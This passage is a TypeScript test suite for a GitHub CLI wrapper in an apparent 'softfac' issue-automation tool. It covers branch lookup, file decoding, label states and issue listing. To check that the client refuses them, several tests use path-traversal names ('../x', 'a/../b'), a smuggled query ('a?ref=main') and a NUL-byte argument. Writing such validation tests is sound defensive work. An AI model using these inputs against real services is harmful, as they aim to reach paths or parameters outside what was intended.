// @effect-diagnostics nodeBuiltinImport:off
import { assert, it } from "@effect/vitest";
import * as Duration from "effect/Duration";
import * as Effect from "effect/Effect";
import * as Fiber from "effect/Fiber";
import * as Layer from "effect/Layer";
import * as Logger from "effect/Logger";
import * as Random from "effect/Random";
import * as TestClock from "effect/testing/TestClock";
import * as NodeFS from "node:fs";
import * as NodePath from "node:path";
import { describe } from "vitest";

import { PROJECT_CONFIG_PATH } from "../config.ts";
import type { Approval, Refusal, TextCheck } from "../domain/approval.ts";
import { FactoryProcess, type RunInput, type RunResult, RunSpawnError } from "../process.ts";
import { APPROVAL_QUERY } from "./approvalHistory.ts";
import {
  ACTIVITY_QUERY,
  COMMENT_EDITOR_QUERY,
  GitHubFailed,
  GitHubInvalidArgument,
  GitHubOutputTooLarge,
  GitHubParse,
  GitHubRateLimited,
  GitHubSpawnError,
  GitHubTimedOut,
  ClaimMemo,
  LIST_LIMIT,
  MARKER,
  MAX_DEPENDS_ON,
  MAX_FILE_BYTES,
  CLOSED_BY_QUERY,
  CLOSING_PRS_QUERY,
  PR_FEEDBACK_QUERY,
  READY_BY_QUERY,
  REVIEW_PAGE_LIMIT,
  REVIEWS_BEFORE_QUERY,
  STATUS_MARKER,
  type Blocker,
  type DropReason,
  type Dropped,
  type Feedback,
  type GitHubError,
  isNotFound,
  isNotReceived,
  isTransientRead,
  isPlainRefName,
  isSafeBranchName,
  makeGitHub,
} from "./github.ts";

type Answer =
  | {
      readonly kind: "result";
      readonly result: Partial<RunResult>;
      readonly delay?: Duration.Input;
    }
  | { readonly kind: "spawn" };

const reply = (stdout: string, stderr = ""): Answer => ({
  kind: "result",
  result: { exitCode: 0, tail: stdout, stderrTail: stderr },
});
const fail = (status: number, stderr: string): Answer => ({
  kind: "result",
  result: { exitCode: status, stderrTail: stderr },
});
const signalKilled = (): Answer => ({ kind: "result", result: { exitCode: null } });
const spawnError = (): Answer => ({ kind: "spawn" });
const timedOut = (): Answer => ({ kind: "result", result: { exitCode: null, timedOut: true } });
const truncated = (): Answer => ({ kind: "result", result: { exitCode: 0, truncated: true } });

const REPO = "rawphp/softfac";
const GH_CONFIG_DIR = "/factory-test/gh-config";

const setup = (...answers: ReadonlyArray<Answer>) => {
  const queue = [...answers];
  const inputs: Array<RunInput> = [];
  const layer = Layer.succeed(
    FactoryProcess,
    FactoryProcess.of({
      run: (input) => {
        inputs.push(input);
        const answer = queue.shift();
        if (answer === undefined || answer.kind === "spawn") {
          return Effect.fail(
            new RunSpawnError({
              shell: false,
              cause: new Error(answer === undefined ? "no queued output" : "gh not found"),
            }),
          );
        }
        const result = Effect.succeed({
          exitCode: 0,
          timedOut: false,
          tail: "",
          stderrTail: "",
          truncated: false,
          ...answer.result,
        } satisfies RunResult);
        return answer.delay === undefined ? result : result.pipe(Effect.delay(answer.delay));
      },
    }),
  );
  return {
    github: makeGitHub({ repo: REPO, ghConfigDir: GH_CONFIG_DIR }),
    inputs,
    calls: (): ReadonlyArray<ReadonlyArray<string>> => inputs.map((input) => input.args ?? []),
    ok: <A>(effect: Effect.Effect<A, GitHubError, FactoryProcess>) =>
      effect.pipe(Effect.provide(layer)),
    err: <A>(effect: Effect.Effect<A, GitHubError, FactoryProcess>) =>
      Effect.flip(effect).pipe(Effect.provide(layer)),
  };
};

const BASE_SHA = "9f8e7d6c5b4a39281706f5e4d3c2b1a098765432";

const refReply = (sha: string) =>
  `{"ref":"refs/heads/main","node_id":"REF_x","url":"https://api.github.com/repos/rawphp/softfac/git/refs/heads/main","object":{"sha":"${sha}","type":"commit","url":"https://api.github.com/repos/rawphp/softfac/git/commits/${sha}"}}`;

const FILE_SHA = BASE_SHA;
const CONFIG_TEXT = "factory:\n  instructors: [tomkaczocha]\n  base: main\n";
const CONFIG_B64 = "ZmFjdG9yeToKICBpbnN0cnVjdG9yczogW3RvbWthY3pvY2hhXQogIGJhc2U6IG1haW4K\n";

const fileReply = (kind: string, encoding: string, size: number, content: string) =>
  `{"name":"config.yml","path":".dw/config.yml","sha":"abc","size":${size},"url":"https://api.github.com/repos/rawphp/softfac/contents/.dw/config.yml?ref=main","type":"${kind}","content":${JSON.stringify(content)},"encoding":"${encoding}","_links":{"self":"x"}}`;

const LIST_ONE =
  '[{"assignees":[{"id":"MDQ6VXNlcjE=","login":"rawphp","name":"Tom"}],"labels":[{"id":"LA_1","name":"factory:needs-info","description":"d","color":"d93f0b"}],"number":6,"title":"GitHub client"}]';
const LIST_MANY =
  '[{"assignees":[],"labels":[],"number":6,"title":"GitHub client"},{"assignees":[{"login":"a"},{"login":"b"}],"labels":[{"name":"factory:ready"},{"name":"Postponed"}],"number":9,"title":"Daemon loop"}]';

const listingOf = (count: number) =>
  `[${Array.from({ length: count }, (_, i) => count - i)
    .map((n) => `{"assignees":[],"labels":[],"number":${n},"title":"issue ${n}"}`)
    .join(",")}]`;

const labelsReply = (names: ReadonlyArray<string>) =>
  `{"labels":[${names
    .map((n) => `{"id":"LA_1","name":"${n}","description":"d","color":"0e8a16"}`)
    .join(",")}]}`;

const editCall = (...rest: ReadonlyArray<string>) => [
  "issue",
  "edit",
  "6",
  "--repo",
  REPO,
  ...rest,
];
const viewLabelsCall = ["issue", "view", "6", "--repo", REPO, "--json", "labels"];
const commentCall = (issue: string, body: string) => [
  "issue",
  "comment",
  issue,
  "--repo",
  REPO,
  "--body",
  body,
];
const listCommentsCall = ["api", "repos/rawphp/softfac/issues/6/comments", "--paginate"];
const patchCall = (id: string, body: string) => [
  "api",
  "-X",
  "PATCH",
  `repos/rawphp/softfac/issues/comments/${id}`,
  "-f",
  `body=${body}`,
];

const ISSUE_VIEW =
  '{"assignees":[{"login":"rawphp"}],"author":{"id":"MDQ6VXNlcjE=","is_bot":false,"login":"tomkaczocha","name":"Tom"},"body":"Build the runner.\\n\\n- one\\n- two","labels":[{"name":"factory:ready"},{"name":"phase:1"}],"number":10,"state":"OPEN","title":"Build step"}';
const issueViewCall = [
  "issue",
  "view",
  "10",
  "--repo",
  REPO,
  "--json",
  "number,title,body,labels,assignees,state,author",
];
const issueJson = (labels: ReadonlyArray<string>, assignees: ReadonlyArray<string>, body: string) =>
  `{"assignees":[${assignees.map((n) => `{"login":"${n}"}`).join(",")}],"author":null,"body":${body},"labels":[${labels.map((n) => `{"name":"${n}"}`).join(",")}],"number":10,"state":"OPEN","title":"Build step"}`;

it.effect("runs gh with the config dir, a 60 s limit and separate stderr on every call", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"), reply("[]"), reply(ISSUE_VIEW), reply(""));
    yield* t.ok(t.github.listIssues("ready"));
    yield* t.ok(t.github.listIssues("ready"));
    yield* t.ok(t.github.issue(10));
    yield* t.ok(t.github.assign(6, "rawphp"));
    assert.strictEqual(t.inputs.length, 4);
    for (const input of t.inputs) {
      assert.strictEqual(input.command, "gh");
      assert.strictEqual(input.env?.GH_CONFIG_DIR, GH_CONFIG_DIR);
      assert.strictEqual(input.separateStderr, true);
      assert.strictEqual(input.timeoutMs, 60_000);
      assert.strictEqual(input.tailBytes, 8 * 1024 * 1024);
      assert.notStrictEqual(input.shell, true);
    }
  }),
);

it.effect("branchTip reads the full commit id of the branch with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply(refReply(BASE_SHA)));
    assert.strictEqual(yield* t.ok(t.github.branchTip("main")), BASE_SHA);
    assert.deepStrictEqual(t.calls(), [["api", "repos/rawphp/softfac/git/ref/heads/main"]]);
  }),
);

it.effect("branchTip keeps slashes in the branch and encodes everything else", () =>
  Effect.gen(function* () {
    const t = setup(reply(refReply(BASE_SHA)), reply(refReply(BASE_SHA)));
    yield* t.ok(t.github.branchTip("release/1.0"));
    yield* t.ok(t.github.branchTip("a b?c#d%e"));
    const calls = t.calls();
    assert.strictEqual(calls[0]![1], "repos/rawphp/softfac/git/ref/heads/release/1.0");
    assert.strictEqual(calls[1]![1], "repos/rawphp/softfac/git/ref/heads/a%20b%3Fc%23d%25e");
  }),
);

it.effect("branchTip refuses an answer that is not a commit id or not a commit", () =>
  Effect.gen(function* () {
    for (const answer of [
      refReply("main"),
      refReply("9f8e7d6c5b4a3928"),
      refReply(BASE_SHA.toUpperCase()).replace("commit", "tag"),
      '{"object":{"type":"commit"}}',
      "[]",
      "not json",
    ]) {
      const t = setup(reply(answer));
      const error = yield* t.err(t.github.branchTip("main"));
      assert.strictEqual(error._tag, "GitHubParse", answer);
    }
  }),
);

it.effect("branchTip accepts a 64 digit id", () =>
  Effect.gen(function* () {
    const sha = "a".repeat(64);
    const t = setup(reply(refReply(sha)));
    assert.strictEqual(yield* t.ok(t.github.branchTip("main")), sha);
  }),
);

it.effect("branchTip refuses a branch name that could leave the refs path, with no call", () =>
  Effect.gen(function* () {
    for (const branch of ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"]) {
      const t = setup(reply(refReply(BASE_SHA)));
      const error = yield* t.err(t.github.branchTip(branch));
      assert.strictEqual(error._tag, "GitHubInvalidArgument", branch);
      assert.deepStrictEqual(t.calls(), [], branch);
      assert.notInclude(error.message, "unexpected output", branch);
    }
  }),
);

it.effect("branchTip of a branch that is not there is the gh failure", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "gh: Not Found (HTTP 404)"));
    const error = yield* t.err(t.github.branchTip("gone"));
    assert.strictEqual(error._tag, "GitHubFailed");
    assert.isTrue(isNotFound(error));
  }),
);

it.effect("defaultBranch reads the repo from the API with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        '{"id":1,"name":"softfac","full_name":"rawphp/softfac","default_branch":"main","private":true}',
      ),
    );
    assert.strictEqual(yield* t.ok(t.github.defaultBranch()), "main");
    assert.deepStrictEqual(t.calls(), [["api", "repos/rawphp/softfac"]]);
  }),
);

it.effect("defaultBranch refuses an answer without one", () =>
  Effect.gen(function* () {
    for (const answer of [
      '{"name":"softfac"}',
      '{"default_branch":""}',
      '{"default_branch":null}',
      "[]",
      "no",
    ]) {
      const t = setup(reply(answer));
      const error = yield* t.err(t.github.defaultBranch());
      assert.strictEqual(error._tag, "GitHubParse", answer);
    }
  }),
);

it.effect("fileAt reads a file at a commit with the exact call and decodes it", () =>
  Effect.gen(function* () {
    const t = setup(reply(fileReply("file", "base64", 51, CONFIG_B64)));
    assert.strictEqual(yield* t.ok(t.github.fileAt(".dw/config.yml", FILE_SHA)), CONFIG_TEXT);
    assert.deepStrictEqual(t.calls(), [
      ["api", `repos/rawphp/softfac/contents/.dw/config.yml?ref=${FILE_SHA}`],
    ]);
  }),
);

it.effect("fileAt decodes content wrapped over several lines and padded", () =>
  Effect.gen(function* () {
    const b64 =
      "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh\nYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQo=\n";
    const t = setup(reply(fileReply("file", "base64", 101, b64)));
    assert.strictEqual(
      yield* t.ok(t.github.fileAt(".dw/config.yml", FILE_SHA)),
      `${"a".repeat(100)}\n`,
    );
  }),
);

it.effect("fileAt refuses a file over the size cap even when its content is whole", () =>
  Effect.gen(function* () {
    // The size check must refuse it on its own: the content matches the stated size.
    const size = MAX_FILE_BYTES + 1;
    const t = setup(reply(fileReply("file", "base64", size, btoa("a".repeat(size)))));
    const error = yield* t.err(t.github.fileAt(".dw/config.yml", FILE_SHA));
    assert.strictEqual(error._tag, "GitHubParse");
    assert.ok(
      error._tag === "GitHubParse" && error.expected.includes("it is too big"),
      error.message,
    );
  }),
);

it.effect("fileAt refuses what is not a plain complete file", () =>
  Effect.gen(function* () {
    for (const answer of [
      // A directory is a JSON array.
      '[{"type":"file","name":"config.yml"}]',
      fileReply("symlink", "base64", 51, CONFIG_B64),
      fileReply("submodule", "base64", 51, CONFIG_B64),
      // A file over 1 MB comes with no content and the encoding `none`.
      fileReply("file", "none", 2_000_000, ""),
      // Under the size cap, but the content is not base64 even though it reads like it.
      fileReply("file", "none", 51, CONFIG_B64),
      fileReply("file", "utf-8", 51, CONFIG_B64),
      // The size says more than the content holds: truncated.
      fileReply("file", "base64", 5_000, CONFIG_B64),
      fileReply("file", "base64", 10, CONFIG_B64),
      // Over the size this reader accepts, whatever the content says.
      fileReply("file", "base64", MAX_FILE_BYTES + 1, CONFIG_B64),
      // Not base64, not UTF-8.
      fileReply("file", "base64", 51, "!!!not base64!!!"),
      fileReply("file", "base64", 3, "//4K\n"),
      "not json",
    ]) {
      const t = setup(reply(answer));
      const error = yield* t.err(t.github.fileAt(".dw/config.yml", FILE_SHA));
      assert.strictEqual(error._tag, "GitHubParse", answer);
    }
  }),
);

it.effect("fileAt refuses base64 whose padding does not fit its length", () =>
  Effect.gen(function* () {
    // `YQ==` is "a" and `YWI=` is "ab". One `=` after two characters, or two after three,
    // is not base64.
    for (const [b64, size] of [
      ["YQ=", 1],
      ["YWI==", 2],
      ["YQ", 1],
      ["YQ==YQ==", 2],
    ] as const) {
      const t = setup(reply(fileReply("file", "base64", size, b64)));
      const error = yield* t.err(t.github.fileAt(".dw/config.yml", FILE_SHA));
      assert.strictEqual(error._tag, "GitHubParse", b64);
    }
    for (const [b64, want] of [
      ["YQ==", "a"],
      ["YWI=", "ab"],
    ] as const) {
      const t = setup(reply(fileReply("file", "base64", want.length, b64)));
      assert.strictEqual(yield* t.ok(t.github.fileAt(".dw/config.yml", FILE_SHA)), want);
    }
  }),
);

it.effect(
  "fileAt makes no call for a ref that is not a full commit id or a path that could leave",
  () =>
    Effect.gen(function* () {
      for (const [path, sha] of [
        [".dw/config.yml", "main"],
        [".dw/config.yml", "9f8e7d6c"],
        [".dw/config.yml", "9f8e7d6c5b4a39281706f5e4d3c2b1a09876543g"],
        ["../x", FILE_SHA],
        ["a//b", FILE_SHA],
        ["", FILE_SHA],
        ["a b", FILE_SHA],
        ["a?ref=main", FILE_SHA],
      ] as const) {
        const t = setup(reply(fileReply("file", "base64", 51, CONFIG_B64)));
        const error = yield* t.err(t.github.fileAt(path, sha));
        assert.strictEqual(error._tag, "GitHubInvalidArgument", `${path} ${sha}`);
        assert.deepStrictEqual(t.calls(), [], `${path} ${sha}`);
        assert.notInclude(error.message, "unexpected output", `${path} ${sha}`);
      }
    }),
);

it.effect("fileAt of a file that is not there is the gh failure", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "gh: Not Found (HTTP 404)"));
    const error = yield* t.err(t.github.fileAt(".dw/config.yml", FILE_SHA));
    assert.strictEqual(error._tag, "GitHubFailed");
  }),
);

/** Literal copies of softfac's lifecycle.rs table, so drift in either module is caught. */
const LABEL_TABLE = [
  [
    "proposed",
    "c5def5",
    "A bot filed it. The factory ignores it until a person sets `factory:ready`.",
  ],
  ["ready", "0e8a16", "Approved for the factory."],
  ["triage", "fbca04", "Claimed. The session is being launched."],
  [
    "needs-info",
    "d93f0b",
    "The factory asked questions on the issue. Answer them, then set `factory:ready`.",
  ],
  ["building", "1d76db", "A session is building it."],
  ["pr-open", "5319e7", "The PR is open and has passed the gate."],
  ["stuck", "b60205", "The factory gave up and said why in a comment."],
] as const;
const ALL_LABEL_NAMES = LABEL_TABLE.map(([state]) => `factory:${state}`);
const createCall = (state: string, color: string, description: string) => [
  "label",
  "create",
  `factory:${state}`,
  "--repo",
  REPO,
  "--color",
  color,
  "--description",
  description,
];

it.effect("ensureLabels on an empty repo creates all seven labels exactly", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"), ...LABEL_TABLE.map(() => reply("")));
    const created = yield* t.ok(t.github.ensureLabels());
    assert.deepStrictEqual(
      created,
      LABEL_TABLE.map(([state]) => state),
    );
    assert.deepStrictEqual(t.calls().slice(1), [
      createCall(
        "proposed",
        "c5def5",
        "A bot filed it. The factory ignores it until a person sets `factory:ready`.",
      ),
      createCall("ready", "0e8a16", "Approved for the factory."),
      createCall("triage", "fbca04", "Claimed. The session is being launched."),
      createCall(
        "needs-info",
        "d93f0b",
        "The factory asked questions on the issue. Answer them, then set `factory:ready`.",
      ),
      createCall("building", "1d76db", "A session is building it."),
      createCall("pr-open", "5319e7", "The PR is open and has passed the gate."),
      createCall("stuck", "b60205", "The factory gave up and said why in a comment."),
    ]);
  }),
);

it.effect("labelNames lists every page with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('[{"name":"bug","color":"d73a4a"}]'),
      reply("[]"),
      reply('[{"name":"a"}][{"name":"b"}]'),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.labelNames()), ["bug"]);
    assert.deepStrictEqual(t.calls()[0], [
      "api",
      "repos/rawphp/softfac/labels?per_page=100",
      "--paginate",
    ]);
    // One array per page reads the same as one merged array.
    yield* t.ok(t.github.labelNames());
    assert.deepStrictEqual(yield* t.ok(t.github.labelNames()), ["a", "b"]);
  }),
);

it.effect("labelNames of a repo gh cannot read is the gh failure", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "gh: Not Found (HTTP 404)"));
    assert.strictEqual((yield* t.err(t.github.labelNames()))._tag, "GitHubFailed");
  }),
);

it.effect("createLabel sends the name, colour and description as arguments", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.createLabel("factory:ready", "0e8a16", "Approved for the factory"));
    assert.deepStrictEqual(t.calls(), [
      [
        "label",
        "create",
        "factory:ready",
        "--repo",
        REPO,
        "--color",
        "0e8a16",
        "--description",
        "Approved for the factory",
      ],
    ]);
  }),
);

it.effect("a refused createLabel is the gh failure", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "HTTP 403: Resource not accessible"));
    const error = yield* t.err(t.github.createLabel("factory:ready", "0e8a16", "d"));
    assert.strictEqual(error._tag, "GitHubFailed");
  }),
);

it.effect("ensureLabels creates only the missing factory labels, in table order", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('[{"name":"bug"},{"name":"factory:ready"}][{"name":"factory:stuck"}]'),
      reply(""),
      reply(""),
      reply(""),
      reply(""),
      reply(""),
    );
    const created = yield* t.ok(t.github.ensureLabels());
    assert.deepStrictEqual(created, ["proposed", "triage", "needs-info", "building", "pr-open"]);
    const calls = t.calls();
    assert.strictEqual(calls.length, 6);
    assert.deepStrictEqual(calls[1], [
      "label",
      "create",
      "factory:proposed",
      "--repo",
      REPO,
      "--color",
      "c5def5",
      "--description",
      "A bot filed it. The factory ignores it until a person sets `factory:ready`.",
    ]);
    assert.deepStrictEqual(
      calls.slice(2).map((call) => call[2]),
      ["factory:triage", "factory:needs-info", "factory:building", "factory:pr-open"],
    );
  }),
);

it.effect("ensureLabels creates nothing when every label exists", () =>
  Effect.gen(function* () {
    const t = setup(reply(JSON.stringify(ALL_LABEL_NAMES.map((name) => ({ name })))));
    assert.deepStrictEqual(yield* t.ok(t.github.ensureLabels()), []);
    assert.strictEqual(t.calls().length, 1);
  }),
);

it.effect("ensureLabels stops at the first failure", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"), reply(""), fail(1, "HTTP 403"), reply(""));
    const error = yield* t.err(t.github.ensureLabels());
    assert.strictEqual(error._tag, "GitHubFailed");
    assert.strictEqual(t.calls().length, 3);
  }),
);

it.effect(
  "a NUL byte in an argument is refused before gh starts and never reaches the message",
  () =>
    Effect.gen(function* () {
      const t = setup(reply(""));
      const error = yield* t.err(t.github.postComment(6, "secret\u0000tail"));
      assert.strictEqual(error._tag, "GitHubSpawnError");
      const bytes = new TextEncoder().encode("secret\u0000tail\n\n<!-- softfac -->").length;
      assert.strictEqual(
        error.message,
        `cannot start \`gh issue comment 6 --repo rawphp/softfac --body <${bytes} bytes>\`: argument contains a NUL byte`,
      );
      assert.notInclude(error.message, "secret");
      assert.strictEqual(t.calls().length, 0);
    }),
);

it.effect("baseConfig reads the branch, its tip and the config file at that tip", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"default_branch":"main"}'),
      reply(refReply(BASE_SHA)),
      reply(fileReply("file", "base64", 51, CONFIG_B64)),
    );
    const base = yield* t.ok(t.github.baseConfig());
    assert.deepStrictEqual(base, { branch: "main", tip: BASE_SHA, text: CONFIG_TEXT });
    assert.deepStrictEqual(t.calls(), [
      ["api", "repos/rawphp/softfac"],
      ["api", "repos/rawphp/softfac/git/ref/heads/main"],
      ["api", `repos/rawphp/softfac/contents/${PROJECT_CONFIG_PATH}?ref=${BASE_SHA}`],
    ]);
  }),
);

it.effect("baseConfig says a missing file has no text, and passes on any other failure", () =>
  Effect.gen(function* () {
    const missing = setup(
      reply('{"default_branch":"main"}'),
      reply(refReply(BASE_SHA)),
      fail(1, "gh: Not Found (HTTP 404)"),
    );
    const none = yield* missing.ok(missing.github.baseConfig());
    assert.deepStrictEqual(none, { branch: "main", tip: BASE_SHA, text: null });

    // A 404 on the branch's tip is not a missing file.
    const noTip = setup(reply('{"default_branch":"main"}'), fail(1, "gh: Not Found (HTTP 404)"));
    assert.isTrue(isNotFound(yield* noTip.err(noTip.github.baseConfig())));

    const server = setup(
      reply('{"default_branch":"main"}'),
      reply(refReply(BASE_SHA)),
      fail(1, "gh: Server Error (HTTP 502)"),
    );
    const failed = yield* server.err(server.github.baseConfig());
    assert.strictEqual(failed._tag, "GitHubFailed");
    assert.isFalse(isNotFound(failed));

    const first = setup(fail(1, "gh: Not Found (HTTP 404)"));
    assert.strictEqual((yield* first.err(first.github.baseConfig()))._tag, "GitHubFailed");
    assert.strictEqual(first.calls().length, 1);
  }),
);

it.effect("listIssues with none", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"));
    const issues = yield* t.ok(t.github.listIssues("ready"));
    assert.deepStrictEqual(issues, { items: [], cut: false });
    assert.deepStrictEqual(t.calls(), [
      [
        "issue",
        "list",
        "--repo",
        REPO,
        "--state",
        "open",
        "--label",
        "factory:ready",
        "--limit",
        "201",
        "--json",
        "number,title,assignees,labels",
      ],
    ]);
  }),
);

it.effect("listIssues with one ignores unknown fields", () =>
  Effect.gen(function* () {
    const t = setup(reply(LIST_ONE));
    const issues = yield* t.ok(t.github.listIssues("needs-info"));
    assert.deepStrictEqual(issues.items, [
      { number: 6, title: "GitHub client", assignees: ["rawphp"], labels: ["factory:needs-info"] },
    ]);
    assert.strictEqual(t.calls()[0]![7], "factory:needs-info");
  }),
);

it.effect("listIssues with several carries each one's label names, or none", () =>
  Effect.gen(function* () {
    const t = setup(reply(LIST_MANY));
    const issues = yield* t.ok(t.github.listIssues("ready"));
    assert.deepStrictEqual(issues.items, [
      { number: 6, title: "GitHub client", assignees: [], labels: [] },
      {
        number: 9,
        title: "Daemon loop",
        assignees: ["a", "b"],
        labels: ["factory:ready", "Postponed"],
      },
    ]);
  }),
);

it.effect("listIssues past the limit returns the first 200 and says it was cut", () =>
  Effect.gen(function* () {
    assert.strictEqual(LIST_LIMIT, 200);
    const t = setup(reply(listingOf(201)));
    const issues = yield* t.ok(t.github.listIssues("ready"));
    assert.isTrue(issues.cut);
    assert.strictEqual(issues.items.length, 200);
    assert.deepStrictEqual(
      issues.items.map((item) => item.number),
      Array.from({ length: 200 }, (_, i) => 201 - i),
    );
    assert.strictEqual(t.calls()[0]![9], "201");
  }),
);

it.effect(
  "claimedIssues maps each triage and building issue to its state, naming a cut listing",
  () =>
    Effect.gen(function* () {
      const t = setup(reply(listingOf(201)), reply(LIST_ONE));
      const claimed = yield* t.ok(t.github.claimedIssues());
      assert.strictEqual(claimed.states.size, 200);
      assert.strictEqual(claimed.states.get(201), "triage");
      // An issue in both listings reads as building, the later one.
      assert.strictEqual(claimed.states.get(6), "building");
      assert.deepStrictEqual(claimed.cut, ["triage"]);
      assert.deepStrictEqual(
        t.calls().map((call) => call[7]),
        ["factory:triage", "factory:building"],
      );
    }),
);

it.effect("listIssues at the limit returns them all and says nothing", () =>
  Effect.gen(function* () {
    const t = setup(reply(listingOf(200)));
    const issues = yield* t.ok(t.github.listIssues("ready"));
    assert.isFalse(issues.cut);
    assert.strictEqual(issues.items.length, 200);
  }),
);

it.effect("issue reads the real shape with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply(ISSUE_VIEW));
    const detail = yield* t.ok(t.github.issue(10));
    assert.deepStrictEqual(t.calls(), [issueViewCall]);
    assert.deepStrictEqual(detail, {
      number: 10,
      title: "Build step",
      body: "Build the runner.\n\n- one\n- two",
      labels: ["factory:ready", "phase:1"],
      assignees: ["rawphp"],
      author: "tomkaczocha",
      state: "ready",
      closed: false,
    });
  }),
);

it.effect("issue says when GitHub has it closed and keeps its factory label", () =>
  Effect.gen(function* () {
    const t = setup(reply(ISSUE_VIEW.replace('"state":"OPEN"', '"state":"CLOSED"')));
    const detail = yield* t.ok(t.github.issue(10));
    assert.isTrue(detail.closed);
    assert.strictEqual(detail.state, "ready");
  }),
);

it.effect("issue author is null when gh gives null or nothing", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(issueJson([], [], '"b"')),
      reply(ISSUE_VIEW.replace(/"author":\{[^}]*\},/, "")),
    );
    assert.strictEqual((yield* t.ok(t.github.issue(10))).author, null);
    assert.strictEqual((yield* t.ok(t.github.issue(10))).author, null);
  }),
);

it.effect("issue state is null with no factory label", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["phase:1", "bug"], [], '"b"')));
    const detail = yield* t.ok(t.github.issue(10));
    assert.strictEqual(detail.state, null);
    assert.deepStrictEqual(detail.assignees, []);
  }),
);

it.effect("issue state is the one factory label", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["bug", "factory:needs-info"], [], '"b"')));
    assert.strictEqual((yield* t.ok(t.github.issue(10))).state, "needs-info");
  }),
);

it.effect("issue state is null with two factory labels", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["factory:ready", "factory:building"], [], '"b"')));
    assert.strictEqual((yield* t.ok(t.github.issue(10))).state, null);
  }),
);

it.effect("issue state is null for an unknown factory label", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["factory:bogus"], [], '"b"')));
    assert.strictEqual((yield* t.ok(t.github.issue(10))).state, null);
  }),
);

it.effect("issue state is null with a bogus and a real factory label in either order", () =>
  Effect.gen(function* () {
    for (const labels of [
      ["factory:bogus", "factory:ready"],
      ["factory:ready", "factory:bogus"],
    ]) {
      const t = setup(reply(issueJson(labels, [], '"b"')));
      assert.strictEqual((yield* t.ok(t.github.issue(10))).state, null, labels.join());
    }
  }),
);

it.effect("issue with a null body has an empty body and keeps every assignee", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["factory:ready"], ["a", "b"], "null")));
    const detail = yield* t.ok(t.github.issue(10));
    assert.strictEqual(detail.body, "");
    assert.deepStrictEqual(detail.assignees, ["a", "b"]);
  }),
);

it.effect("issue errors are typed", () =>
  Effect.gen(function* () {
    const failing = setup(fail(1, "not found"));
    const failed = yield* failing.err(failing.github.issue(10));
    assert.strictEqual(failed._tag, "GitHubFailed");
    assert.strictEqual(failed._tag === "GitHubFailed" ? failed.status : 0, 1);

    const wrong = setup(reply("[]"));
    assert.strictEqual((yield* wrong.err(wrong.github.issue(10)))._tag, "GitHubParse");

    const nullAssignees = setup(reply('{"assignees":null}'));
    assert.strictEqual(
      (yield* nullAssignees.err(nullAssignees.github.issue(10)))._tag,
      "GitHubParse",
    );
  }),
);

it.effect("issue uses the number it is given", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["factory:ready"], [], '"b"')));
    yield* t.ok(t.github.issue(7));
    assert.deepStrictEqual(t.calls()[0]!.slice(0, 3), ["issue", "view", "7"]);
  }),
);

it.effect("setState from one wrong label", () =>
  Effect.gen(function* () {
    const t = setup(reply(labelsReply(["factory:ready"])), reply(""));
    yield* t.ok(t.github.setState(6, "triage"));
    assert.deepStrictEqual(t.calls(), [
      viewLabelsCall,
      editCall("--add-label", "factory:triage", "--remove-label", "factory:ready"),
    ]);
  }),
);

it.effect("setState from two factory labels", () =>
  Effect.gen(function* () {
    const t = setup(reply(labelsReply(["factory:ready", "factory:stuck"])), reply(""));
    yield* t.ok(t.github.setState(6, "building"));
    assert.deepStrictEqual(t.calls(), [
      viewLabelsCall,
      editCall(
        "--add-label",
        "factory:building",
        "--remove-label",
        "factory:ready",
        "--remove-label",
        "factory:stuck",
      ),
    ]);
  }),
);

it.effect("setState removes extras when the target is already present", () =>
  Effect.gen(function* () {
    const t = setup(reply(labelsReply(["factory:triage", "factory:ready"])), reply(""));
    yield* t.ok(t.github.setState(6, "triage"));
    assert.deepStrictEqual(t.calls(), [
      viewLabelsCall,
      editCall("--remove-label", "factory:ready"),
    ]);
  }),
);

it.effect("setState adds when there is no factory label", () =>
  Effect.gen(function* () {
    const t = setup(reply(labelsReply(["phase:1"])), reply(""));
    yield* t.ok(t.github.setState(6, "ready"));
    assert.deepStrictEqual(t.calls(), [viewLabelsCall, editCall("--add-label", "factory:ready")]);
  }),
);

it.effect("setState already correct makes no edit", () =>
  Effect.gen(function* () {
    const t = setup(reply(labelsReply(["phase:1", "factory:building"])));
    yield* t.ok(t.github.setState(6, "building"));
    assert.deepStrictEqual(t.calls(), [viewLabelsCall]);
  }),
);

it.effect("setState leaves non-factory labels alone", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(labelsReply(["phase:1", "factory:ready", "bug", "factory-ish"])),
      reply(""),
    );
    yield* t.ok(t.github.setState(6, "triage"));
    assert.deepStrictEqual(
      t.calls()[1],
      editCall("--add-label", "factory:triage", "--remove-label", "factory:ready"),
    );
  }),
);

it.effect("setState reads the real view shape", () =>
  Effect.gen(function* () {
    const real =
      '{"assignees":[{"login":"rawphp"}],"labels":[{"id":"x","name":"factory:ready","description":"d","color":"0e8a16"},{"name":"phase:1"}]}';
    const t = setup(reply(real), reply(""));
    yield* t.ok(t.github.setState(6, "triage"));
    assert.strictEqual(t.calls().length, 2);
